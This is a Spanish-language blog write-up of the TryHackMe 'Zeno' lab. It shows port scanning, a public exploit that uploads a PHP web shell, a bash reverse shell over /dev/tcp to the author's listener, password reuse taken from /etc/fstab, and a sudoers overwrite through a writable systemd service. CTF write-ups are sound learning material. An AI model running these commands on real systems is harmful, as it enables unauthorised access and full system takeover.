<!doctype html><html lang=es>
<head>
<title>
Zeno - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Medio Biniru    Reconocimiento ¡Bienvenid@ de nuevo!
¡Comencemos esta máquina con un escaneo nmap, para ver qué servicios se están ejecutando!
╰─ lanfran@parrot ❯ sudo nmap 10.10.229.206 -p- -sS --min-rate 5000 -n -Pn ─╯ [sudo] password for lanfran: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/es/posts/zeno/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/es/posts/zeno/cover.jpeg">
<meta name=twitter:title content="Zeno - Write Up - Español">
<meta name=twitter:description content="Máquina de nivel medio en TryHackMe.">
<meta property="og:title" content="Zeno - Write Up - Español">
<meta property="og:description" content="Máquina de nivel medio en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/es/posts/zeno/"><meta property="og:image" content="/es/posts/zeno/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-23T13:13:28+02:00">
<meta property="article:modified_time" content="2021-10-23T13:13:28+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/es/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Zeno - Write Up - Español</h1>
<div class=post-meta>
<span class=post-date>
2021-10-23
</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 4 mins lectura</span>
</div>
<span class=post-tags>
<a href=/tags/rce/>#RCE</a>&nbsp;
<a href=/tags/service/>#service</a>&nbsp;
<a href=/tags/sudo/>#sudo</a>&nbsp;
<a href=/tags/rms/>#RMS</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/es/posts/zeno/cover.jpeg alt="Zeno - Write Up - Español">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li>
<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
<li><a href=#root>Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Nivel</th>
<th>Creador</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/zeno>Aquí</a></td>
<td>Medio</td>
<td><a href=https://tryhackme.com/p/Biniru>Biniru</a></td>
</tr>
</tbody>
</table>
<h2 id=reconocimiento>Reconocimiento</h2>
<p>¡Bienvenid@ de nuevo!</p>
<p>¡Comencemos esta máquina con un escaneo <code>nmap</code>, para ver qué servicios se están ejecutando!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo nmap 10.10.229.206 -p- -sS --min-rate <span style=color:#ae81ff>5000</span> -n -Pn                                                                            ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-23 13:16 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.229.206
Host is up <span style=color:#f92672>(</span>0.14s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65533</span> filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
12340/tcp open  unknown

Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 26.86 seconds
</code></pre></div><p>¡Excelente! ¡Un servicio <code>ssh</code> en el puerto<code> 22</code> y un servicio <code>desconocido(servidor web)</code> ejecutándose en el puerto <code>12340</code>!</p>
<p>¡Ahora escaneemos el puerto web con <code>gobuster</code>, para ver qué archivos están ocultos!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ scan_long http://10.10.229.206:12340/                                                                                             ─╯
<span style=color:#f92672>===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@_FireFart_<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:            http://10.10.229.206:12340/
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:        <span style=color:#ae81ff>50</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes:   200,204,301,302,307,401,403
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:     gobuster/3.0.1
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:        10s
<span style=color:#f92672>===============================================================</span>
2021/10/23 13:38:39 Starting gobuster
<span style=color:#f92672>===============================================================</span>
/rms <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
2021/10/23 13:43:56 Finished
<span style=color:#f92672>===============================================================</span>
</code></pre></div><p>¡Una carpeta con una página web ejecutándose!</p>
<p>¡Veamos esta web!</p>
<p><img src=web.png alt=web></p>
<p><code>Restaurant Management System</code> está diciendo la página, ¡tal vez podamos encontrar un exploit público para ella!</p>
<p>¡Y si! Tenemos uno <a href=exp.py>aquí</a></p>
<p>Ejecutarlo creará un shell php donde podemos obtener una shell reversa.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ python3 exp.py http://10.10.229.206:12340/rms/                                                                                    ─╯

    _  _   _____  __  __  _____   ______            _       _ _
  _| <span style=color:#f92672>||</span> |_|  __ <span style=color:#ae81ff>\|</span>  <span style=color:#ae81ff>\/</span>  |/ ____| |  ____|          | |     <span style=color:#f92672>(</span>_<span style=color:#f92672>)</span> |
 |_  __  _| |__<span style=color:#f92672>)</span> | <span style=color:#ae81ff>\ </span> / | <span style=color:#f92672>(</span>___   | |__  __  ___ __ | | ___  _| |_
  _| <span style=color:#f92672>||</span> |_|  _  /| |<span style=color:#ae81ff>\/</span>| |<span style=color:#ae81ff>\_</span>__ <span style=color:#ae81ff>\ </span> |  __| <span style=color:#ae81ff>\ \/</span> / <span style=color:#e6db74>&#39;_ \| |/ _ \| | __|
</span><span style=color:#e6db74> |_  __  _| | \ \| |  | |____) | | |____ &gt;  &lt;| |_) | | (_) | | |_
</span><span style=color:#e6db74>   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
</span><span style=color:#e6db74>                                             | |
</span><span style=color:#e6db74>                                             |_|
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Credits : All InfoSec (Raja Ji&#39;</span>s<span style=color:#f92672>)</span> Group
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Restaurant Management System Exploit, Uploading Shell
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Shell Uploaded. Please check the URL : http://10.10.229.206:12340/rms/images/reverse-shell.php
</code></pre></div><p>¡Podemos comprobar si la shell está funcionando con un comando común!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl <span style=color:#e6db74>&#34;http://10.10.229.206:12340/rms/images/reverse-shell.php?cmd=id&#34;</span>                                                             ─╯
uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>system_u:system_r:httpd_t:s0
</code></pre></div><p>¡Y si! El servidor se está ejecutando con el usuario <code>apache</code>.</p>
<h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
<p>Consigamos una shell reversa!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>Terminal 1<span style=color:#f92672>]</span>

╰─ lanfran@parrot ❯ curl http://10.10.229.206:12340/rms/images/reverse-shell.php<span style=color:#ae81ff>\?</span>cmd<span style=color:#ae81ff>\=</span>bash+-i+%3E%26+/dev/tcp/10.9.2.74/1337+0%3E%261                ─╯

------

<span style=color:#f92672>[</span>Terminal 2<span style=color:#f92672>]</span>

╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                     ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
connect to <span style=color:#f92672>[</span>10.9.2.74<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.229.206<span style=color:#f92672>]</span> <span style=color:#ae81ff>39332</span>
bash: no job control in this shell
bash-4.2$ id
id
uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>system_u:system_r:httpd_t:s0
</code></pre></div><p>Ahora, escaneemos la máquina con <code>Linpeas</code> o manualmente&mldr;</p>
<p>¡Podemos encontrar un archivo, almacenando los sistemas de archivos compartidos! y dentro de ella una contraseña para el usuario <code>zeno</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.2$ cat /etc/fstab

<span style=color:#75715e>#</span>
<span style=color:#75715e># /etc/fstab</span>
<span style=color:#75715e># Created by anaconda on Tue Jun  8 23:56:31 2021</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># Accessible filesystems, by reference, are maintained under &#39;/dev/disk&#39;</span>
<span style=color:#75715e># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span>
<span style=color:#75715e>#</span>
/dev/mapper/centos-root	/	xfs	defaults	<span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
UUID<span style=color:#f92672>=</span>507d63a9-d8cc-401c-a660-bd57acfd41b2	/boot	xfs	defaults	<span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
/dev/mapper/centos-swap	swap	swap	defaults	<span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
<span style=color:#75715e>#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=F[REDACTADO]a,domain=localdomain,soft	0 0</span>
</code></pre></div><p>Tal vez podamos probar esta contraseña con el usuario de esta máquina <code>edward</code> &mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.2$ su edward
Password: 
<span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ id
uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>edward<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>edward<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>edward<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>system_u:system_r:httpd_t:s0
<span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ cat /home/edward/user.txt 
THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</code></pre></div><p>¡Sip, funcionó!</p>
<h2 id=root>Root</h2>
<p>¡Ahora escalemos a root!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>,
    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>,
    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>,
    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>,
    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
    secure_path<span style=color:#f92672>=</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin

User edward may run the following commands on zeno:
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/sbin/reboot
</code></pre></div><p>¡Podemos ejecutar como sudo el binario <code>reboot</code>!</p>
<p>Buscando los archivos de esta máquina, encontramos que el archivo <code>zeno-monitoring.service</code> tiene escritura para todos.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ ls -la /etc/systemd/system/zeno-monitoring.service
-rw-rw-rw-. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>141</span> Sep <span style=color:#ae81ff>21</span> 22:24 /etc/systemd/system/zeno-monitoring.service
</code></pre></div><p>¡Así que podemos editarlo para ejecutar un exploit!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ cat /etc/systemd/system/zeno-monitoring.service
<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
Description<span style=color:#f92672>=</span>Zeno monitoring

<span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
Type<span style=color:#f92672>=</span>simple
User<span style=color:#f92672>=</span>root
ExecStart<span style=color:#f92672>=</span>/root/zeno-monitoring.py

<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
WantedBy<span style=color:#f92672>=</span>multi-user.target
</code></pre></div><p>Editándolo, debería verse así:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ cat /etc/systemd/system/zeno-monitoring.service
<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
Description<span style=color:#f92672>=</span>Zeno monitoring

<span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
Type<span style=color:#f92672>=</span>simple
User<span style=color:#f92672>=</span>root
ExecStart<span style=color:#f92672>=</span>/bin/sh -c <span style=color:#e6db74>&#39;echo &#34;edward ALL=(root) NOPASSWD: ALL&#34; &gt; /etc/sudoers&#39;</span>

<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
WantedBy<span style=color:#f92672>=</span>multi-user.target
</code></pre></div><p>Este exploit agregará nuestro usuario al archivo <code>sudoers</code>, por lo que podemos ejecutar todos los comandos con <code>sudo</code>.</p>
<p>Después de eso, ¡reiniciemos la máquina y veamos si el exploit funcionó!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>edward@zeno home<span style=color:#f92672>]</span>$ sudo /usr/sbin/reboot 
</code></pre></div><p>Espere a que la máquina se reinicie y conéctese a través de <code>ssh</code> con el usuario <code>edward</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh edward@10.10.229.206                                                                                                          ─╯
edward@10.10.229.206<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: 
Last login: Sat Oct <span style=color:#ae81ff>23</span> 14:38:36 <span style=color:#ae81ff>2021</span>
<span style=color:#f92672>[</span>edward@zeno ~<span style=color:#f92672>]</span>$ id
uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>edward<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>edward<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>edward<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
<span style=color:#f92672>[</span>edward@zeno ~<span style=color:#f92672>]</span>$ sudo -l
User edward may run the following commands on zeno:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: ALL
</code></pre></div><p>¡El exploit funcionó! ¡Podemos ejecutar cualquier comando con sudo!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>edward@zeno ~<span style=color:#f92672>]</span>$ sudo su
<span style=color:#f92672>[</span>root@zeno edward<span style=color:#f92672>]</span><span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
<span style=color:#f92672>[</span>root@zeno edward<span style=color:#f92672>]</span><span style=color:#75715e># cat /root/root.txt </span>
THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</code></pre></div><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Leer otros posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/es/posts/lockdown/>
<span class=button__icon>←</span>
<span class=button__text>Lockdown - Write Up - Español</span>
</a>
</span>
<span class="button next">
<a href=/es/posts/year_of_the_fox/>
<span class=button__text>Year Of The Fox - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">Lanfran02</div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>